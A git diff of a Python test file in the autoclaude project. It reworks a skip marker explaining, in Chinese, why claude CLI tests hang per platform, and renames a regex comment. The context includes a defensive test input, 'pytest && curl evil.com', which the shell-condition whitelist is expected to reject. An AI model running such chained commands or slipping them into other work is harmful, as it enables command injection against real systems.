@@ -47,14 +47,23 @@ from autoclaude.utils.config import AppConfig
 # DEF-101-089 原結論在 `claude -p` 非互動 subprocess spawn 上確實已被推翻（rc=0／約 4s），
 # 但那條路不是本檔走的路。判準維持不變（拿掉這半個條件會當場掛死整棵樹，已注入實證）。
 # 三次量測與對照組見 `docs/06_quality/CrossPlatform_R79_Debt_Audit.md` 的 `## DEF-101-913` 節。
+#
+# 🔴 R85（macOS 本機輪）：上面那段因果是 **Windows 專屬**的（mac 上 `wexpect` 未安裝，
+# `_start_wexpect()` 結構上到不了）。**完整推導、mac 側量測與承接方向只寫在一個地方**——
+# `test_gap014_020.py` 同款註解的 R85 段；本檔刻意不複寫，避免同一份知識住兩個家而只有
+# 一個家被改（本檔與該檔的 reason 字串在 R79~R84 期間就是這樣一起漂的）。
+# 一句話結論：判準維持不變（mac 上實測 `env -u CLAUDECODE pytest 本檔` 逾 600s 未完成），
+# 但 mac 側成因**未歸因**，不得寫成已歸因。
 requires_claude_cli = pytest.mark.skipif(
     shutil.which("claude") is None or os.environ.get("CLAUDECODE") == "1",
     reason="[ENV-DISABLED] 【未啟用，非缺件】需要 claude CLI binary 且非巢狀 Claude Code "
-    "session（巢狀 session 內 wexpect pty spawn 掛住不回，R79 實測 180s×2＋45s、claude.exe "
-    "從未啟動；剝除 CLAUDECODE 的對照組行為相同 ⇒ 該變數是環境標記非成因。見 DEF-101-913）。"
+    "session。🔴 成因**因平台而異**（完整推導見 test_gap014_020.py 的 R85 段，本檔不複寫）："
+    "Windows＝wexpect pty spawn 掛住不回（DEF-101-913）；macOS＝wexpect 未安裝、該機制到不了，"
+    "但 R85 實測仍逾 600s 未完成 ⇒ 成因未知且未歸因。"
     "跑法：在**非** Claude Code session 的 PowerShell 執行 "
     "`python -m pytest tests/test_gap039_049.py`"
-    "（每日 nightly 排程即為此環境，2026-08-06 nightly log 實測會真的跑）",
+    "（每日 nightly 排程即為此環境，2026-08-06 nightly log 實測會真的跑）。"
+    "治本方向＝SD_10 P3-R56-2 改用 fake-executor 重寫，使兩平台都跑得到",
 )
 
 
@@ -580,7 +589,7 @@ def test_gap046_conditional_allows_safe_evaluator():
 def test_gap046_production_regex_rejects_chain_attacks():
     """Gap-046 修復（問題 #4）：生產端 regex 應拒絕 &&/||/>/< 等鏈式/重定向字符。"""
     import re
-    # 與生產碼 _SAFE_COND_PATTERN 一致
+    # 與生產碼 _SHELL_TRUE_COND_WHITELIST 一致
     _SAFE = re.compile(r'^[\w\s\-./=:!"\']+$')
     # 鏈式執行攻擊
     assert not _SAFE.match("pytest && curl evil.com"), "&& 應被拒絕"
